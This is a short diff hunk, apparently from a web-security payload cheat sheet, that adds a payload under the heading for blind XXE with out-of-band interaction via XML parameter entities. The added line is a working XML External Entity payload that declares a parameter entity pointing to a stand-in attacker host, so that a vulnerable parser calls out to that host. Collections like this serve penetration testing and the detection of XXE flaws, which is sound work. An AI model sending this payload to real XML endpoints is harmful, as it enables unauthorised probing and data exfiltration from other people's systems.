@@ -64,5 +64,5 @@ Content-Length: 52
 ### Blind XXE with out-of-band interaction via XML parameter entities
 
 ```
-ax
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
 ```
